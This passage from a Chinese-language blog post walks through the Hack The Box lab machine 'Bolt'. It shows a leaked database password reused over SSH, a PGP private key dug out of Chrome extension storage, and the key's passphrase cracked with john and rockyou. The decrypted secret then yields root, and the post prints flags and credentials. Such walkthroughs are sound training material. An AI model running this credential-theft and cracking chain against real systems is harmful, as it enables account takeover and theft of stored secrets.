+    // Database configuration.
+    &#39;Datasources&#39; =&gt; [
+        &#39;default&#39; =&gt; [
+            &#39;host&#39; =&gt; &#39;localhost&#39;,
+            &#39;port&#39; =&gt; &#39;3306&#39;,
+            &#39;username&#39; =&gt; &#39;passbolt&#39;,
+            &#39;password&#39; =&gt; &#39;rT2;jW7&lt;eY8!dX8}pQ8%&#39;,
+            &#39;database&#39; =&gt; &#39;passboltdb&#39;,
+        ],
+    ],
+
+    // Email configuration.
+    &#39;EmailTransport&#39; =&gt; [
+        &#39;default&#39; =&gt; [
+            &#39;host&#39; =&gt; &#39;localhost&#39;,
+            &#39;port&#39; =&gt; 587,
+            &#39;username&#39; =&gt; null,
+            &#39;password&#39; =&gt; null,
+            // Is this a secure connection? true if yes, null if no.
+            &#39;tls&#39; =&gt; true,
+            //&#39;timeout&#39; =&gt; 30,
+            //&#39;client&#39; =&gt; null,
+            //&#39;url&#39; =&gt; null,
+        ],
+    ],
+    &#39;Email&#39; =&gt; [
+        &#39;default&#39; =&gt; [
+            // Defines the default name and email of the sender of the emails.
+            &#39;from&#39; =&gt; [&#39;localhost@bolt.htb&#39; =&gt; &#39;localhost&#39;],
+            //&#39;charset&#39; =&gt; &#39;utf-8&#39;,
+            //&#39;headerCharset&#39; =&gt; &#39;utf-8&#39;,
+        ],
+    ],
+    &#39;passbolt&#39; =&gt; [
+        // GPG Configuration.
+        // The keyring must to be owned and accessible by the webserver user.
+        // Example: www-data user on Debian
+        &#39;gpg&#39; =&gt; [
+            // Main server key.
+            &#39;serverKey&#39; =&gt; [
+                // Server private key fingerprint.
+                &#39;fingerprint&#39; =&gt; &#39;59860A269E803FA094416753AB8E2EFB56A16C84&#39;,
+                &#39;public&#39; =&gt; CONFIG . DS . &#39;gpg&#39; . DS . &#39;serverkey.asc&#39;,
+                &#39;private&#39; =&gt; CONFIG . DS . &#39;gpg&#39; . DS . &#39;serverkey_private.asc&#39;,
+            ],
+        ],
+        &#39;registration&#39; =&gt; [
+            &#39;public&#39; =&gt; false,
+        ],
+        &#39;ssl&#39; =&gt; [
+            &#39;force&#39; =&gt; true,
+        ]
+    ],
+];
+</code></pre>
+<p>该文件提供了一个数据库的账号密码，登入查看一下</p>
+<pre><code class="sql">/etc/passbolt$ mysql -upassbolt -p
+
+mysql&gt; show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| passboltdb         |
++--------------------+
+
+mysql&gt; use passboltdb
+
+mysql&gt; show tables;
+show tables;
++-----------------------+
+| Tables_in_passboltdb  |
++-----------------------+
+| account_settings      |
+| action_logs           |
+| actions               |
+| authentication_tokens |
+| avatars               |
+| comments              |
+| email_queue           |
+| entities_history      |
+| favorites             |
+| gpgkeys               |
+| groups                |
+| groups_users          |
+| organization_settings |
+| permissions           |
+| permissions_history   |
+| phinxlog              |
+| profiles              |
+| resource_types        |
+| resources             |
+| roles                 |
+| secret_accesses       |
+| secrets               |
+| secrets_history       |
+| user_agents           |
+| users                 |
++-----------------------+
+
+mysql&gt; select * from users;
+select * from users;
++--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
+| id                                   | role_id                              | username       | active | deleted | created             | modified            |
++--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
+| 4e184ee6-e436-47fb-91c9-dccb57f250bc | 1cfcd300-0664-407e-85e6-c11664a7d86c | eddie@bolt.htb |      1 |       0 | 2021-02-25 21:42:50 | 2021-02-25 21:55:06 |
+| 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 | 975b9a56-b1b1-453c-9362-c238a85dad76 | clark@bolt.htb |      1 |       0 | 2021-02-25 21:40:29 | 2021-02-25 21:42:32 |
++--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
+2 rows in set (0.00 sec)
+</code></pre>
+<p>很可惜没有找到密码</p>
+<p>不过发现还有一个secrets的字段，查看一下</p>
+<pre><code class="sql">mysql&gt; desc secrets;
+desc secrets;
++-------------+------------+------+-----+---------+-------+
+| Field       | Type       | Null | Key | Default | Extra |
++-------------+------------+------+-----+---------+-------+
+| id          | char(36)   | NO   | PRI | NULL    |       |
+| user_id     | char(36)   | NO   | MUL | NULL    |       |
+| resource_id | char(36)   | NO   | MUL | NULL    |       |
+| data        | mediumtext | NO   |     | NULL    |       |
+| created     | datetime   | NO   |     | NULL    |       |
+| modified    | datetime   | NO   |     | NULL    |       |
++-------------+------------+------+-----+---------+-------+
+6 rows in set (0.01 sec)
+
+mysql&gt; select data from secrets;
+select data from secrets;
+-----BEGIN PGP MESSAGE-----
+Version: OpenPGP.js v4.10.9
+Comment: https://openpgpjs.org
+
+wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
+g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
+pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
+oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
+l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
+zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
+edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
+l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
+oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
+FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
+8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
+5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
+NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
+Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
+nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
+TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
+=P38i
+-----END PGP MESSAGE-----
+</code></pre>
+<p>但是没有私钥我们依然无法进行利用，尝试使用数据库的密码来登陆eddie账户</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ssh eddie@bolt.htb                                      
+eddie@bolt.htb&#39;s password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-051300-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 updates can be applied immediately.
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+You have mail.
+Last login: Fri Jan  7 21:38:40 2022 from 10.10.14.56
+eddie@bolt:~$ whoami&amp;&amp;id
+eddie
+uid=1000(eddie) gid=1000(eddie) groups=1000(eddie)
+</code></pre>
+<p>登陆成功，那我们刚才不是白找了？</p>
+<pre><code class="sql">eddie@bolt:~$ cat user.txt 
+483ad2fdf8e588c500b8a58b286ffb8b
+</code></pre>
+<p>成功拿到user全新的flag文件</p>
+<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>在&#x2F;var&#x2F;mail下找到了一封名为eddie的邮件，查看一下</p>
+<pre><code class="bash">eddie@bolt:~$ cat /var/mail/eddie
+From clark@bolt.htb  Thu Feb 25 14:20:19 2021
+Return-Path: &lt;clark@bolt.htb&gt;
+X-Original-To: eddie@bolt.htb
+Delivered-To: eddie@bolt.htb
+Received: by bolt.htb (Postfix, from userid 1001)
+        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
+Subject: Important!
+To: &lt;eddie@bolt.htb&gt;
+X-Mailer: mail (GNU Mailutils 3.7)
+Message-Id: &lt;20210225212019.DFF264CD@bolt.htb&gt;
+Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
+From: Clark Griswold &lt;clark@bolt.htb&gt;
+
+Hey Eddie,
+
+The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
+Once you&#39;re set up you can start importing your passwords.  Please be sure to keep good security in mind - there&#39;s a few things I read about in a security whitepaper that are a little concerning...
+
+-Clark
+</code></pre>
+<p>这里的大概意思就是Clark用户发了一封邮件，告诉Eddie用户，要注意备份私钥。既然提示里已经说了备份，那肯定就有，咱们去找出来就好</p>
+<pre><code class="bash">eddie@bolt:~$ grep -iR &quot;BEGIN PGP&quot;
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:    if (!message.match(/-----BEGIN PGP MESSAGE-----/)) {
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PUBLIC_HEADER = &#39;-----BEGIN PGP PUBLIC KEY BLOCK-----&#39;;
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PRIVATE_HEADER = &#39;-----BEGIN PGP PRIVATE KEY BLOCK-----&#39;;
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:  const reHeader = /^-----BEGIN PGP (MESSAGE, PART \d+\/\d+|MESSAGE, PART \d+|SIGNED MESSAGE|MESSAGE|PUBLIC KEY BLOCK|PRIVATE KEY BLOCK|SIGNATURE)-----$/m;
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:  // BEGIN PGP MESSAGE, PART X/Y
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:    // BEGIN PGP MESSAGE, PART X
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      // BEGIN PGP SIGNED MESSAGE
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:        // BEGIN PGP MESSAGE
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:          // BEGIN PGP PUBLIC KEY BLOCK
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:            // BEGIN PGP PRIVATE KEY BLOCK
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:              // BEGIN PGP SIGNATURE
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:              // cleartext signatures. Note that PGP 2.x uses BEGIN PGP MESSAGE
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(&quot;-----BEGIN PGP MESSAGE, PART &quot; + partindex + &quot;/&quot; + parttotal + &quot;-----\r\n&quot;);
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(&quot;-----BEGIN PGP MESSAGE, PART &quot; + partindex + &quot;-----\r\n&quot;);
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(&quot;\r\n-----BEGIN PGP SIGNED MESSAGE-----\r\n&quot;);
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(&quot;\r\n-----BEGIN PGP SIGNATURE-----\r\n&quot;);
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(&quot;-----BEGIN PGP MESSAGE-----\r\n&quot;);
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(&quot;-----BEGIN PGP PUBLIC KEY BLOCK-----\r\n&quot;);
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(&quot;-----BEGIN PGP PRIVATE KEY BLOCK-----\r\n&quot;);
+.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(&quot;-----BEGIN PGP SIGNATURE-----\r\n&quot;);
+Binary file .config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
+.viminfo:~MSle0~/BEGIN PGP
+.viminfo::/BEGIN PGP
+.viminfo:|2,0,1642385169,,&quot;/BEGIN PGP&quot;
+.viminfo:? BEGIN PGP
+.viminfo:|2,1,1642385169,,&quot;BEGIN PGP&quot;
+</code></pre>
+<p>在eddie用户的目录下搜索BEGIN PGP可得到一些存在令牌的文件，查看发现主要着眼于.config&#x2F;google-chrome&#x2F;Default&#x2F;Local Extension Settings&#x2F;didegimhafipceonhjepacocaffmoppf&#x2F;000003.log这个文件</p>
+<p>正常查看的时候是一堆乱码，我们使用vim打开，然后使用命令模式输入%s&#x2F;\\r\\n&#x2F;\r&#x2F;g，即可进入只管可看的状态</p>
+<p>然后得到了一串gpg</p>
+<pre><code class="bash">-----BEGIN PGP PRIVATE KEY BLOCK-----
+Version: OpenPGP.js v4.10.9
+Comment: https://openpgpjs.org
+
+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
+PSwYYWlAywj5
+=cqxZ
+-----END PGP PRIVATE KEY BLOCK-----
+</code></pre>
+<p>保存到桌面</p>
+<p>使用gpg2john给转换为hash格式</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# gpg2john gpg.key &gt; gpg.hash
+
+File gpg.key
+
+┌──(root💀kali)-[~/Desktop]
+└─# cat gpg.hash               
+Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson &lt;eddie@bolt.htb&gt;::gpg.key
+</code></pre>
+<p>使用john进行爆破hash</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 16777216 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+merrychristmas   (Eddie Johnson)
+1g 0:00:14:54 DONE (2022-01-16 22:08) 0.001118g/s 47.90p/s 47.90c/s 47.90C/s mhines..menudo
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+<p>直接使用爆破出来的hash是无法登录的</p>
+<p>现在让我们来解密得到的加密信息，首先需要导入Eddie用户的公钥和私钥</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# gpg --batch --import gpg.key 
+gpg: 钥匙箱‘/root/.gnupg/pubring.kbx’已创建
+gpg: /root/.gnupg/trustdb.gpg：建立了信任度数据库
+gpg: 密钥 1C2741A3DC3B4ABD：公钥 “Eddie Johnson &lt;eddie@bolt.htb&gt;” 已导入
+gpg: 密钥 1C2741A3DC3B4ABD：私钥已导入
+gpg: 处理的总数：1
+gpg:               已导入：1
+gpg:       读取的私钥：1
+gpg:   导入的私钥：1
+</code></pre>
+<p>现在我们已经导入了私钥，接下来需要解密加密信息</p>
+<p>将在mysql数据库中读取到的密钥保存为gpg.asc文件</p>
+<p>然后进行读取</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# gpg --pinentry-mode loopback --passphrase merrychristmas -d gpg.asc
+gpg: 由 2048 位的 RSA 密钥加密，标识为 F65CA879A3D77FE4，生成于 2021-02-25
+      “Eddie Johnson &lt;eddie@bolt.htb&gt;”
+{&quot;password&quot;:&quot;Z(2rmxsNW(Z?3=p/9s&quot;,&quot;description&quot;:&quot;&quot;}gpg: 签名建立于 2021年03月06日 星期六 10时33分54秒 EST
+gpg:               使用 RSA 密钥 1C2741A3DC3B4ABD
+gpg: 完好的签名，来自于 “Eddie Johnson &lt;eddie@bolt.htb&gt;” [未知]
+gpg: 警告：此密钥未被受信任签名认证！
+gpg:       没有证据表明此签名属于其声称的所有者。
+主密钥指纹： DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD
+</code></pre>
+<p>该root用户无法使用ssh登录，只能用eddie账户来切换过去</p>
+<pre><code class="bash">eddie@bolt:~$ su -
+Password: 
+root@bolt:~# whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>成功切换到root权限</p>
+<pre><code class="bash">root@bolt:~# ls
+root.txt  snap
+root@bolt:~# cat root.txt 
+a351a21d0cfab4c55dac1cb648369408
+</code></pre>
+<p>成功拿到root权限的flag文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/&title=《Bolt - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/&title=《Bolt - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bolt - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/01/17/Hackthebox/Hackthebox-Bolt/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/02/19/Hackthebox/Hackthebox-Paper/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Paper - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/01/08/Hackthebox/Hackthebox-Pandora/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Pandora - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
